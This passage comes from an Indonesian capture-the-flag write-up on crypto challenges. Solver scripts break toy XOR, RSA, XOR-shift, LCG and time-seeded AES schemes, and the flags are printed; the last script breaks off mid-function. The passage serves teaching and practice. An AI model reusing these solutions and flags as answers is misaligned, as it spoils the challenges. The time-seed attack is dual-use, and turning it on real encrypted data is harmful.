+hex_blob = "0x1f0x160x690x110x320x6f0x280x340x690x230xe0xb0xd0x6e0x370x20x1f0xb0x1f0xc0x4e0x30x4b0x730x730xe0x1a0x150x3f0x680xf0x730x3d0x240x7b0xa0x410x650x140x690x360x60x710x4a0x390x450x180x120x340x4e0x1b0x2f0x4e0x5f0x330x7e0x560x220x3d0x490x5c0xc0x180x41"
+
+parts = hex_blob.split('0x')[1:]
+vals = [int(p[:2], 16) for p in parts]
+
+random.seed(0)
+
+flag = ''.join(chr(v ^ random.randint(32, 127)) for v in vals)
+print(flag)
+```
+
+dan hasilnya mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-72.png)
+
+Flag: NCLPS1\{r4nd0m\_s33d\_h4ny4\_s3bu4h\_ps3d0\_r4nd0m\_d3ng4n\_n1l4i\_t3t4p\}
+
+### Chall: tanpa kunci
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-73.png)
+
+Skenario:
+
+Disini saya mendapatkan 2 file, [chall.py](http://chall.py) yang berisi  
+
+```py
+FLAG = "NCLPS1{REDACTED}"
+KEY = "" # REDACTED
+
+def xor_cipher(data, key):
+    data_bytes = data.encode('utf-8')
+    key_bytes = key.encode('utf-8')
+    key_len = len(key_bytes)
+
+    result = bytearray()
+
+    for i, byte in enumerate(data_bytes):
+        key_byte = key_bytes[i % key_len]
+
+        xored_byte = byte ^ key_byte
+        result.append(xored_byte)
+
+    return bytes(result)
+
+if __name__ == "__main__":
+    encrypted_flag = xor_cipher(FLAG, KEY)
+    encrypted_hex = encrypted_flag.hex()
+
+    print(f"Encrypted: {encrypted_hex}")
+```
+
+dan file output.txt yang berisi
+
+Encrypted: 3d700f2260655a07072d02070b4a404a1c10463f151d6c2e4640604d475b1c0100381514021c02073a4b475d242d43261215023b2d40604c476c27415d33151d6c33465d3e151d541c19002d5c
+
+di script [chall.py](http://chall.py) itu pakai XOR berulang untuk enkripsi yang artinya setiap karakter flag di XOR dengan karakter key yang berulang, disini saya harus mendapatkan key dulu, jadi saya buat script yang dimana saya ambil dulu 7 byte awal plain text (NCLPS1\{) dan 7 byte awal ciphertext dari output.txt, lalu akan melakukan operasi XOR yang hasilnya adalah key, setelah key didapat kita bisa dapatkan flagnya juga
+
+```py
+ct_hex = open("output.txt").read().strip()
+ct = bytes.fromhex(ct_hex)
+
+known = b"NCLPS1{"
+
+key = bytes([ct[i] ^ known[i] for i in range(len(known))])
+print("Key =", key)
+
+plain = bytes([ct[i] ^ key[i % len(key)] for i in range(len(ct))])
+print("Flag =", plain.decode())
+```
+
+dan hasilnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-74.png)
+
+Flag: NCLPS1\{t4np4\_k3y\_buk4n\_m4s4l4h\_s3l4g1\_p4nj4ng\_pr3f1x\_s4m4\_d3ng4n\_p4nj4ng\_k3y\}
+
+### Chall: klasik
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-75.png)
+
+Skenario:
+
+Disini saya mendapatkan file chall.txt yang berisi
+
+I5GTGRCHJVBFGR2BLJKE2TK2KJDUSWKEI5HFEVCHIFNEIQKNLJLUOTKZIRCU2QSUI5MVUVCDJVJFCR2NGNCEOTKKKNDUCWSUJVGVUUSHJFMUIR2OKJKEOQK2IRAU2WSVI5GVSRCFJVBFIR2ZLJKECTKSKFDU2M2EI5GUUU2HIFNFITKNLJIUOSKZIRDU4USUI5AVURCBJVNFOR2NLFCEKTKCKRDVSWSUIFGVEUKHJUZUIR2NJJJUOQK2KRGU2WSSI5EVSRCHJZBFIR2BLJCECTK2K5DU2WKEIVGUEVCHLFNFIQ2NKJIUOTJTIRDU2QSTI5AVUVCNJVNFCR2JLFCEOTSSKRDUKWSEIFGVUV2HJVMVIRKNIJKEOWK2KRAU2USRI5GTGRCHJVBFGR2BLJKESTK2KFDUSWKEI5HFEVCHIFNEIQKNLJLUOTKZKRCU2QSUI5MVUVCBJVJFCR2NGNCEOTKKKNDUCWSUJVGVUUKHJFMUIR2OKJKEOQK2IRAU2WSXI5GVSRCFJVBFIR2ZLJKECTKSKFDU2MSEI5GUEU2HIFNFITKNLJIUOSKZIRDU4USUI5CVURCBJVNFOR2NLFCEKTKCKRDVSWSUINGVEUKHJUZUIR2NIJJUOQK2KRGU2WSRI5EVSRCHJZJFIR2FLJCECTK2K5DU2WKUIVGUEVCHKFNFIQKNKJIUOTJTIRDU2QSTI5AVUVCNJVNFCR2JLFCEOTSSKRDUKWSEIFGVUV2HJVMVIRKNIJKEOWK2KRAU2USRI5GTGRCHJVBFGR2BLJKE2TK2KFDUSWKEI5HFEVCHIVNEIQKNLJKUOTKZIRCU2QSUI5MVUVCBJVJFCR2NGNCEOTKKKNDUCWSUJVGVUUSHJFMUIR2OKJKEORK2IRAU2WSXI5GVSVCFJVBFIR2ZLJKECTKSKFDU2M2EI5GUUU2HIFNFITKNLJJEOSKZIRDU4QSUI5AVURCBJVNFOR2NLFCEKTKCKRDVSWSUINGVEUKHJUZUIR2NJJJUOQK2KRGU2WSRI5EVSRCHJZJFIR2FLJCECTK2K5DU2WKUIVGUEVCHLFNFIQKNKJIUOTJTIRDU2QSTI5AVUVCJJVNFCR2JLFCEOTSSKRDUCWSEIFGVUV2HJVMVIRKNIJKEOWK2KRBU2USRI5GTGRCHJVBFGR2BLJKE2TK2KFDUSWKEI5HFEVCHIFNEIQKNLJLUOTKZIRCU2QSUI5MVUVCDJVJFCR2NGJCEOTKCKNDUCWSUJVGVUUKHJFMUIR2OKJKEORK2IRAU2WSXI5GVSVCFJVBFIR2ZLJKECTKSKFDU2M2EI5GUUU2HIFNFITKNLJJEOSKZIRDU4USUI5CVURCBJVNFOR2NLFCEKTKCKRDVCWSUIFGVEUKHJUZUIR2NIJJUOQK2KRGU2WSSI5EVSRCHJZJFIR2FLJCECTK2K5DU2WKEIVGUEVCHLFNFIQ2NKJIUOTJTIRDU2QSTI5AVUVCNJVNFER2JLFCEOTSSKRDUCWSEIFGVUVKHJVMUIRKNIJKEOWK2KRAU2USRI5GTGRCHJVFFGR2BLJKE2TK2KJDUSWKEI5HFEVCHIVNEIQKNLJLUOTKZIRCU2QSUI5MVUVCDJVJFCR2NGNCEOTKCKNDUCWSUJVGVUUSHJFMUIR2OIJKEOQK2IRAU2WSXI5GVSRCFJVBFIR2ZLJKEGTKSKFDU2M2EI5GUUU2HIFNFITKNLJJEOSKZIRDU4USUI5AVURCBJVNFOR2NLFKEKTKCKRDVSWSUIFGVEUKHJUZUIR2NIJJUOQK2KREU2WSRI5EVSRCHJZJFIR2BLJCECTK2K5DU2WKUIVGUEVCHLFNFIQKNKJIUOTJTIRDU2SSTI5AVUVCNJVNFER2JLFCEOTSSKRDUKWSEIFGVUV2HJVMVIRKNIJKEOWK2KRBU2USRI5GTERCHJVBFGR2BLJKE2TK2KFDUSWKEI5HFEVCHIVNEIQKNLJLUOTKZKRCU2QSUI5MVUVCBJVJFCR2NGNCEOTKCKNDUCWSUJVGVUUKHJFMUIR2OKJKEORK2IRAU2WSXI5GVSRCFJVBFIR2RLJKECTKSKFDU2M2EI5GUEU2HIFNFITKNLJJEOSKZIRDU4USUI5CVURCBJVNFOR2NLFCEKTKCKRDVSWSUIFGVEUKHJUZUIR2NIJJUOQK2KRGU2WSRI5EVSRCHJZJFIR2FLJCECTK2KVDU2WKEIVGUEVCHLFNFIQKNKJIUOTJTIRDU2SSTI5AVUVCNJVNFER2JLFCEOTSSKRDUCWSEIFGVUV2HJVMVIRKNIJKEOWK2KRBU2USRI5GTGRCHJVFFGR2BLJKE2TK2KFDUSWKEI5HEEVCHIFNEIQKNLJLUOTKZIRCU2QSUI5MVUVCDJVJFCR2NGNCEOTKKKNDUCWSUJVGVUUKHJFMUIR2OKJKEOQK2IRAU2WSXI5GVSVCFJVBFIR2ZLJKEGTKSKFDU2M2EI5GUUU2HIFNFISKNLJIUOSKZIRDU4USUI5AVURCBJVNFOR2NLFKEKTKCKRDVSWSUIFGVEUKHJUZUIR2NJJJUOQK2KRGU2WSSI5EVSRCHJZJFIR2FLJCECTK2K5DU2WKUIVGUEVCHLFNFIQ2NKJIUOTJSIRDU2QSTI5AVUVCNJVNFCR2JLFCEOTSSKRDUKWSEIFGVUV2HJVMVIRKNIJKEOWK2KRAU2USRI5GTGRCHJVFFGR2BLJKE2TK2KFDUSWKEI5HFEVCHIVNEIQKNLJLUOTKZIRCU2QSUI5IVUVCBJVJFCR2NGNCEOTKCKNDUCWSUJVGVUUSHJFMUIR2OKJKEORK2IRAU2WSXI5GVSRCFJVBFIR2ZLJKECTKSKFDU2M2EI5GUEU2HIFNFITKNLJIUOSKZIRDU4USUI5CVURCBJVNFKR2NLFCEKTKCKRDVSWSUIFGVEUKHJUZUIR2NJJJUOQK2KRGU2WSSI5EVSRCHJZJFIR2BLJCECTK2K5DU2WKUIVGUEVCHLFNFIQ2NKJIUOTJTIRDU2SSTI5AVUVCNJVNFCR2JLFCEOTSCKRDUCWSEIFGVUV2HJVMUIRKNIJKEOWK2KRBU2USRI5GTGRCHJVFFGR2BLJKE2TK2KFDUSWKEI5HFEVCHIFNEIQKNLJLUOTKZKRCU2QSUI5MVUVCDJVJFCR2NGNCEOTKKKNDUCWSUJFGVUUKHJFMUIR2OKJKEOQK2IRAU2WSXI5GVSVCFJVBFIR2ZLJKEGTKSKFDU2M2EI5GUEU2HIFNFITKNLJIUOSKZIRDU4USUI5AVURCBJVNFOR2NLFCEKTKCKRDVSWSUINGVEUKHJUZEIR2NIJJUOQK2KRGU2WSRI5EVSRCHJZJFIR2FLJCECTK2K5DU2WKUIVGUEVCHLFNFIQKNKJIUOTJTIRDU2SSTI5AVUVCNJVNFER2JLFCEOTSSKRDUKWSEIFGVUV2HJVMUIRKNIJKEOUK2KRAU2USRI5GTGRCHJVBFGR2BLJKE2TK2KJDUSWKEI5HFEVCHIFNEIQKNLJLUOTKZKRCU2QSUI5MVUVCDJVJFCR2NGNCEOTKKKNDUCWSUJVGVUUSHJFMUIR2OKJKEORK2IRAU2WSVI5GVSRCFJVBFIR2ZLJKECTKSKFDU2M2EI5GUUU2HIFNFITKNLJJEOSKZIRDU4USUI5AVURCBJVNFOR2NLFKEKTKCKRDVSWSUINGVEUKHJUZUIR2NIJJUOQK2KRGU2WSSI5EVSRCHJZBFIR2BLJCECTK2K5DU2WKEIVGUEVCHLFNFIQ2NKJIUOTJTIRDU2SSTI5AVUVCNJVNFCR2JLFCEOTSSKRDUCWSEIFGVUV2HJVMVIRKNIJKEOWK2KRAU2USRI5GTGRCHJVFFGR2BLJKESTK2KFDUSWKEI5HFEVCHIFNEIQKNLJLUOTKZKRCU2QSUI5MVUVCDJVJFCR2NGNCEOTKCKNDUCWSUJVGVUUSHJFMUIR2OKJKEORK2IRAU2WSXI5GVSVCFJVBFIR2ZLJKECTKSKFDU2MSEI5GUEU2HIFNFITKNLJIUOSKZIRDU4USUI5CVURCBJVNFOR2NLFKEKTKCKRDVSWSUINGVEUKHJUZUIR2NJJJUOQK2KRGU2WSRI5EVSRCHJZJFIR2BLJCECTK2K5DU2WKUIVGUEVCHKFNFIQKNKJIUOTJTIRDU2QSTI5AVUVCNJVNFER2JLFCEOTSSKRDUKWSEIFGVUV2HJVMUIRKNIJKEOWK2KRAU2USRI5GTGRCHJVFFGR2BLJKE2TK2KFDUSWKEI5HFEVCHIVNEIQKNLJKUOTKZIRCU2QSUI5MVUVCBJVJFCR2NGNCEOTKKKNDUCWSUJVGVUUSHJFMUIR2OKJKEORK2IRAU2WSXI5GVSRCFJVBFIR2ZLJKECTKSKFDU2M2EI5GUUU2HIFNFITKNLJIUOSKZIRDU4QSUI5AVURCBJVNFOR2NLFCEKTKCKRDVSWSUINGVEUKHJUZUIR2NJJJUOQK2KRGU2WSRI5EVSRCHJZJFIR2BLJCECTK2K5DU2WKEIVGUEVCHLFNFIQKNKJIUOTJTIRDU2SSTI5AVUVCJJVNFCR2JLFCEOTSSKRDUCWSEIFGVUV2HJVMVIRKNIJKEOWK2KRBU2USRI5GTGRCHJVBFGR2BLJKE2TK2KJDUSWKEI5HFEVCHIFNEIQKNLJLUOTKZIRCU2QSUI5MVUVCBJVJFCR2NGJCEOTKCKNDUCWSUJVGVUUKHJFMUIR2OKJKEORK2IRAU2WSXI5GVSRCFJVBFIR2ZLJKEGTKSKFDU2M2EI5GUUU2HIFNFITKNLJJEOSKZIRDU4USUI5CVURCBJVNFOR2NLFKEKTKCKRDVCWSUIFGVEUKHJUZUIR2NIJJUOQK2KRGU2WSSI5EVSRCHJZJFIR2FLJCECTK2K5DU2WKUIVGUEVCHLFNFIQ2NKJIUOTJTIRDU2SSTI5AVUVCNJVNFCR2JLFCEOTSSKRDUKPJ5HU6T2PI=
+
+ini adalah base32, saya coba decode, saya decode sekali hasilnya masih base32, lalu saya decode lagi dan hasilnya mendapatkan string hex
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-76.png)
+
+lalu saya decode dari hex
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-77.png)
+
+nah setelah mendapatkan hasilnya saya memakai recipe magic dari cyberchef dan mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-78.png)
+
+Flag: NCLPS1\{lanjut\_bang\_jangan\_menyerah\_\}
+
+### Chall: Dial & Decode
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-79.png)
+
+Skenario:
+
+Disini saya mendapatkan folder .zip yang jika diextract, didalamnya terdapat message.wav, p\_dial.wav, q\_dial.wav dan challenge.py
+
+[challenge.py](http://challenge.py) berisi
+
+```py
+import numpy as np
+from scipy.io.wavfile import write
+from Crypto.Util.number import getPrime, bytes_to_long
+import random
+
+dtmf_freqs = {
+    '1': (697, 1209), '2': (697, 1336), '3': (697, 1477), 'A': (697, 1633),
+    '4': (770, 1209), '5': (770, 1336), '6': (770, 1477), 'B': (770, 1633),
+    '7': (852, 1209), '8': (852, 1336), '9': (852, 1477), 'C': (852, 1633),
+    '*': (941, 1209), '0': (941, 1336), '#': (941, 1477), 'D': (941, 1633),
+}
+
+def text_to_tone(text, filename, fs=8000, tone_time=0.08, silence_time=0.10):
+    samples = []
+    for char in text:
+        if char not in dtmf_freqs:
+            continue
+        f1, f2 = dtmf_freqs[char]
+        t = np.linspace(0, tone_time, int(fs * tone_time), endpoint=False)
+
+        phase1 = random.uniform(0, 2 * np.pi)
+        phase2 = random.uniform(0, 2 * np.pi)
+        tone = 0.5 * np.sin(2 * np.pi * f1 * t + phase1) + 0.5 * np.sin(2 * np.pi * f2 * t + phase2)
+        samples.append(tone)
+        samples.append(np.zeros(int(fs * silence_time)))
+    sig = np.concatenate(samples)
+    sig = (sig * 32767).astype(np.int16)
+    write(filename, fs, sig)
+
+p = getPrime(512)
+q = getPrime(512)
+n = p * q
+e = 65537
+
+flag = b"dummy{ini_flag_palsu}"
+m = bytes_to_long(flag)
+c = pow(m, e, n)
+
+p_str = str(p)
+q_str = str(q)
+c_str = str(c)
+
+text_to_tone(p_str, "p_dial.wav")
+text_to_tone(q_str, "q_dial.wav")
+text_to_tone(c_str, "message.wav")
+```
+
+ternyata script ini memakai RSA klasik dengan modulus n=p.q dan public exponentnya 65537, c adalah ciphertext hasil enkripsi flag, lalu flag dikonversi menjadi bilangan dengan bytes\_to\_long, jadi saya tau strukruk enkripsi yang dipakai tapi tidak ada p, q dan c nya, kemungkinan berada di .wav
+
+lalu untuk p\_dial.wav, q\_dial.wav dan message.wav, karena di deskripsi ada kata “menelepon” yang berarti ini mengarah ke sinyal **DTMF** (Dual-Tone Multi-Frequency), yang jika di decode hasilnya
+
+decode message.wav 23262255488146430918134487539323608765122032828855189416033296446089102871336817803499729127295239793836079760539108783273479693969294748415923855498988997974213517038279256035390923190560153542109078722891002669265097025570929637786710807681410539409419175351080917298805767171485510646358497464809421349215
+
+ini ternyata ciphertext RSA(c)
+
+decode p\_dial.wav
+
+12507400811267358494375566060588729932682284985843897895357405707424594600802700536339805481582444541457711275838986990779286969842440858282300613729624861
+
+ini ternyata bilangan prima p
+
+decode q\_dial.wav
+
+6751398103588752219624511186150376580421059043219972353779244556920241532423840395963397800631556888795019335116324629794441812186199681851303777248803307
+
+ini ternyata bilangan prima q
+
+karna disini saya telah mendapatkan p, q dan c nya, saya tinggal buat scriptnya saja
+
+```py
+# solve_dial_decode.py
+c_str = "23262255488146430918134487539323608765122032828855189416033296446089102871336817803499729127295239793836079760539108783273479693969294748415923855498988997974213517038279256035390923190560153542109078722891002669265097025570929637786710807681410539409419175351080917298805767171485510646358497464809421349215"
+p_str = "12507400811267358494375566060588729932682284985843897895357405707424594600802700536339805481582444541457711275838986990779286969842440858282300613729624861"
+q_str = "6751398103588752219624511186150376580421059043219972353779244556920241532423840395963397800631556888795019335116324629794441812186199681851303777248803307"  
+
+c = int(c_str)
+p = int(p_str)
+q = int(q_str)
+
+n = p * q
+phi = (p - 1) * (q - 1)
+e = 65537
+d = pow(e, -1, phi)
+
+m = pow(c, d, n)
+flag = m.to_bytes((m.bit_length() + 7) // 8, 'big').decode()
+
+print("Flag:", flag)
+```
+
+dan hasilnya saya mendapatkan flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-80.png)
+
+Flag: NCLPS1\{hai1\_BOl3H\_aku\_m1nta\_nom0r\_t3lepOn\_k4mu?\_0dcd60dab2\}
+
+### Chall: collisions
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-81.png)
+
+Skenario:
+
+Disini saya mendapatkan 2 file yaitu, [chall.py](http://chall.py) yang berisi
+
+```py
+import functools; print(functools.reduce(lambda flag, i: flag ^ (flag >> 2**i), range(9), int.from_bytes(b"NCLPS1{redacted}", "big")))
+```
+
+dan output.txt yang berisi
+
+6708225246577317268201359870589947128321270453156893234886662491398921333524854484228506876784333764380835907785971649995603806504942718660141508646410278513251598900
+
+int.from\_bytes() mengubah flag jadi bilangan bulat
+
+fungsi pada [chall.py](http://chall.py) melakukan operasi berulang, yang artinya setiap langkah kita ambil nilai flag, geser ke kanan 2\*\*i bit, lalu di XOR dengan flag awal
+
+hasil akhirnya diprint dan itulah angka panjang yang ada di output.txt
+
+disini saya tinggal mereversenya saja, untuk mereverse y = x \^ (x >> s) dimulai dari x = y lalu lakukan lagi x \^= (x >> s), x \^= (x >> 2\**s), *x \^= (x >> 4\*s), dst, teruskan sampai shift lebih besar dari panjang bit angka, hasil akhirnya itu sama dengan nilai asli sebelum XOR
+
+```py
+y = 6708225246577317268201359870589947128321270453156893234886662491398921333524854484228506876784333764380835907785971649995603806504942718660141508646410278513251598900
+
+def invert_shift_right(y, s, bitlen=None):
+    if bitlen is None:
+        bitlen = y.bit_length() + 256
+    x = y
+    shift = s
+    while shift < bitlen:
+        x ^= (x >> shift)
+        shift *= 2
+    return x
+
+val = y
+for i in reversed(range(9)):
+    val = invert_shift_right(val, 2**i)
+
+b = val.to_bytes((val.bit_length() + 7)//8, 'big')
+print(b.decode())
+```
+
+dan hasilnya saya mendaapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-82.png)
+
+Flag: NCLPS1\{h4sh\_t1d4k\_s3cur3\_k3t1k4\_t3rj4d1\_c0ll1s10ns\_p4d4\_r3sult\_v4lu3\}
+
+### Chall: quadratic
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-83.png)
+
+Skenario:
+
+Disini saya mendapatkan 2 file, [chall.py](http://chall.py) yang berisi
+
+```py
+from Crypto.Util.number import getPrime, bytes_to_long
+
+BITS_1 = 105
+BITS_2 = 55
+e = 65537
+FLAG = b"NCLPS1{REDACTED}"
+
+p = getPrime(BITS_1)
+q = getPrime(BITS_1)
+n = p * q
+S = p + q
+m = bytes_to_long(FLAG)
+c = pow(m, e, n)
+
+p2 = getPrime(BITS_2)
+q2 = getPrime(BITS_2)
+n2 = p2 * q2
+phi2 = (p2 - 1) * (q2 - 1)
+while phi2 % e == 0:
+    p2 = getPrime(BITS_2)
+    q2 = getPrime(BITS_2)
+    n2 = p2 * q2
+    phi2 = (p2 - 1) * (q2 - 1)
+
+c_S = pow(S, e, n2)
+
+print(f"n = {n}")
+print(f"e = {e}")
+print(f"c = {c}")
+print(f"n2 = {n2}")
+print(f"c_S = {c_S}")
+```
+
+dan output.txt yang berisi
+
+n = 482334770038158502104509019645301481449088150613131321272064999  
+e = 65537  
+c = 217030574813581748876560164628956728965229484123293220878296186  
+n2 = 568758980618471233824985353927557  
+c\_S = 194122074286685911567008750253330
+
+setelah menganalisa [chall.py](http://chall.py), ini adalah challenge yang mirip RSA, normalnya, RSA hanya kasih kita modulus n = p.q, tapi di chall ini, selain n, kita juga dapat p+q atau saya sebut S, tapi S tidak dikasih langsung, tapi dienkripsi lagi dengan modulus lain, yaitu n2 = p2.q2 (masing” 55bit) dan output yang dikasih n, e, c, n2, c\_S, kalau kita tau perkalian p.q dan perjumlahan p+q, kita bisa balikin angka” p dan q dengan mudah, nah disini tugas saya adalah gimana caranya membalikan flagnya.
+
+Karena saya sudah punya n, e, c, n2, dan c\_S, saya tinggal cari S (p+q), nilai S ini disembunyikan dengan cara dienkripsi lagi, tapi pake modulus kecil yaitu n2, karena n2 cukup kecil untuk difaktorkan, dari situ saya bisa menghitung balik nilai asli S, setelah sudah tau nilai S, saya bisa cari nilai p dan q dengan mudah, caranya tinggal cocokkan dua angka yang kalau dijumlahkan hasilnya S dan jika dikali hasilnya n, setelah dapet p dan q nya, saya bisa hitung kunci private RSA, terus tinggal decrypt cipher text untuk mendapatkan flag
+
+```py
+from Crypto.Util.number import long_to_bytes, inverse
+import math, random
+
+n  = 482334770038158502104509019645301481449088150613131321272064999
+e  = 65537
+c  = 217030574813581748876560164628956728965229484123293220878296186
+n2 = 568758980618471233824985353927557
+cS = 194122074286685911567008750253330
+
+def brent(n):
+    if n % 2 == 0:
+        return 2
+    y, c, m = random.randrange(1,n-1), random.randrange(1,n-1), 100
+    g, r, q, x = 1, 1, 1, y
+    while g == 1:
+        x = y
+        for _ in range(r):
+            y = (y*y + c) % n
+        k = 0
+        while k < r and g == 1:
+            ys = y
+            for _ in range(min(m, r-k)):
+                y = (y*y + c) % n
+                q = (q * abs(x-y)) % n
+            g = math.gcd(q, n)
+            k += m
+        r <<= 1
+    if g == n:
+        while True:
+            ys = (ys*ys + c) % n
+            g = math.gcd(abs(x-ys), n)
+            if g > 1:
+                break
+    return g
+
+p2 = brent(n2)
+q2 = n2 // p2
+phi2 = (p2-1)*(q2-1)
+d2 = inverse(e, phi2)
+
+S = pow(cS, d2, n2)
+print("S =", S)
+
+D = S*S - 4*n
+sqrtD = math.isqrt(D)
+p = (S + sqrtD)//2
+q = (S - sqrtD)//2
+
+phi = (p-1)*(q-1)
+d = inverse(e, phi)
+
+m = pow(c, d, n)
+flag = long_to_bytes(m)
+print("FLAG =", flag.decode())
+```
+
+dan hasilnya saya mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-84.png)
+
+Flag: NCLPS1\{p3r\$4m44n\_kv4dr4t\_\}
+
+### Chall: thread
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-85.png)
+
+Skenario:
+
+Disini saya mendapatkan 2 file, [chall.py](http://chall.py) yang berisi
+
+```py
+import time
+import random
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+INPUT_IMAGE = 'flag.png'
+ENCRYPTED_OUTPUT = 'flag.png.enc'
+
+def encrypt_file():
+    with open(INPUT_IMAGE, 'rb') as f:
+        plaintext = f.read()
+
+    t1 = int(time.time()) // 10
+
+    # print(f"Enkripsi diproses di sekitar timestamp: {t1}")
+    random.seed(t1)
+
+    key = random.randbytes(16)
+    iv = random.randbytes(16)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+
+    encrypted_data = cipher.encrypt(pad(plaintext, AES.block_size))
+
+    with open(ENCRYPTED_OUTPUT, 'wb') as f:
+        f.write(encrypted_data)
+
+    print(f"File '{INPUT_IMAGE}' berhasil dienkripsi menjadi '{ENCRYPTED_OUTPUT}'.")
+
+if __name__ == "__main__":
+    encrypt_file()
+```
+
+dan file flag.png.enc, ini merupakan output dari chall.py
+
+di deskripsi terdapat artikel yang setelah saya baca berisi informasi bahwa Ransomware Akira (Linux/ESXi 2024 variant) membangkitkan key enkripsi dari timestamp (waktu) dalam presisi nanodetik, karena timestamp file sistem (VMFS) hanya disimpan dalam presesi detik, korban bisa mencoba bruteforce kombinasi timestamp untuk menebak key, problemnya itu prosesnya berat banget, karena setiap kandidat timestamp harus diproses ribuan kali hashing (SHA-256), makannya perlu banget pake GPU cluster biar feasible, nah di [chall.py](http://chall.py) menunjukkan bahwa key dan IV AES dibuatnya dengan cara
+
+```py
+t1 = int(time.time()) // 10
+random.seed(t1)
+key = random.randbytes(16)
+iv  = random.randbytes(16)
+```
+
+jadi seednya itu bukan nanodetik, tapi 1 seed berlaku untuk 10 detik, jadinya ruang pencariannya kecil banget, bisa dibruteforce pakai CPU
+
+di [chall.py](http://chall.py) juga saya sudah tahu langkah enkripsinya, yaitu pertama” ambil timestampnya (dibagi 10) lalu seed RNG python (random.seed(t1)), lalu generate key + IV dari RNG dan terakhir enkripsi flag.png dengan AES-CBC, yang artinya untuk mendecryptnya, saya hanya perlu bruteforce semua kemungkinan t1 di sekitar agustus 2025, terlihat dari deskripsi yang lagi kejar tayang di bulan agustus tahun ini
+
+```py
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import random
+import os
+import datetime
+
+enc_path = "flag.png.enc"
+with open(enc_path,"rb") as f:
+    ciphertext = f.read()
+
+c0 = ciphertext[:16]
+png_sig = b'\x89PNG\r\n\x1a\n'
+
+def try_seed_block(t1):
+    random.seed(t1)
+    key = random.randbytes(16)
+    iv  = random.randbytes(16)
+    ecb = AES.new(key, AES.MODE_ECB)
+    dec0 = ecb.decrypt(c0)
+    pt0 = bytes(a^b for a,b in zip(dec0, iv))
+    if pt0.startswith(png_sig):
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        try:
+            pt = unpad(cipher.decrypt(ciphertext), AES.block_size)
+            out = f"recovered_flag_t1_{t1}.png"
+            with open(out,"wb") as o:
+                o.write(pt)
+            return out
+        except Exception:
+            return None
+    return None
+
+start = datetime.datetime(2025, 7, 20)
+end   = datetime.datetime(2025, 9, 9, 23, 59, 59)
+
+dt = start
+found = None
+while dt <= end:
+    t1 = int(dt.timestamp()) // 10
+    out = try_seed_block(t1)
+    if out:
+        print(f"Found candidate seed: {t1}")
+        print(f"Saved full PNG to {out}")
+        found = out
+        break
+    dt += datetime.timedelta(seconds=10)
+
+if not found:
+    print("Not found.")
+
+```
+
+dan setelah dijalankan sayapun mendapatkan seed dan gambarnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-86.png)
+
+dan untuk gambarnya berisi flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-87.png)
+
+Flag: NCLPS1\{t3rk4d4ng\_b3rh4d4p4n\_d3ng4n\_3nkr1ps1\_h4rus\_s4b4r\_m3nunggu\_w4ktu\_y4ng\_l4m4\}
+
+### Chall: gerbang logika
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-88.png)
+
+Skenario:
+
+Disini saya mendapatkan 2 file, file [chall.py](http://chall.py) yang berisi
+
+```py
+import hashlib
+import random
+
+FLAG = "" # REDACTED FLAG
+INITIAL_STATE = random.randint(0, 2**27)
+
+# LCG?
+A = 69069
+M = 2**32
+
+def update_state(current_state, plain_char_ord):
+    return (A * current_state + plain_char_ord) % M
+
+def encrypt_char(plain_char, current_state):
+    xor_key = (current_state >> 8) & 0xFF
+    out = ord(plain_char) ^ xor_key
+    swap_mode = current_state % 3
+
+    if swap_mode == 0:
+        var1 = (out & 0xAA) >> 1
+        var2 = (2 * out) & 0xAA
+        return var1 | var2
+    elif swap_mode == 1:
+        var1 = (out & 0xCC) >> 2
+        var2 = (4 * out) & 0xCC
+        return var1 | var2
+    else:
+        var1 = (out & 0xF0) >> 4
+        var2 = (16 * out) & 0xF0
+        return var1 | var2
+
+if __name__ == "__main__":
+    encrypted_result = []
+    state = INITIAL_STATE
+
+    for char in FLAG:
+        encrypted_char_ord = encrypt_char(char, state)
+        encrypted_result.append(chr(encrypted_char_ord))
+        state = update_state(state, ord(char))
+
+    encrypted_flag = "".join(encrypted_result)
+    final_hash = hashlib.sha256(FLAG.encode()).hexdigest()
+
+    print(f"Encrypted Flag  : {encrypted_flag.encode('latin-1').hex()}")
+    print(f"SHA256 Checksum : {final_hash}")
+```
+
+dan output.txt yang berisi
+
+```txt
+Encrypted Flag  : d0e3094ebed1f12ac681efe295f3b16d8047b9d51f0dd1a322f0d0a8df9c68f62778987611e9cade7b76946a994c44db
+SHA256 Checksum : 781ea8ef7526f9e0abf2362a30ebf1e46ada7ed0dfd4dd55321d4a6baef4cd49
+```
+
+Engkripsi di [chall.py](http://chall.py) memakai PRNG (LCG) dengan INITIAL\_STATE 27 bit yang tiap karakter, jadi buat dideskripsinya saya harus mencoba semua kemungkinan INITIAL\_STATE, saya mencoba membuat [solve.p](http://solve.pt)y yang berisi
+
+```py
+import argparse
+import hashlib
+from multiprocessing import Pool, cpu_count
+from functools import partial
+
+A = 69069
+MOD = 2**32
+MAX_INIT = 1 << 27
+
+PRINTABLE = set(range(32, 127)) | {9, 10, 13}
+
+def forward_swap(out, mode):
+    """Apply the same bit-transform as in chall.py"""
+    if mode == 0:
+        var1 = (out & 0xAA) >> 1
+        var2 = (2 * out) & 0xAA
+        return (var1 | var2) & 0xFF
+    elif mode == 1:
+        var1 = (out & 0xCC) >> 2
+        var2 = (4 * out) & 0xCC
+        return (var1 | var2) & 0xFF
+    else:
+        var1 = (out & 0xF0) >> 4
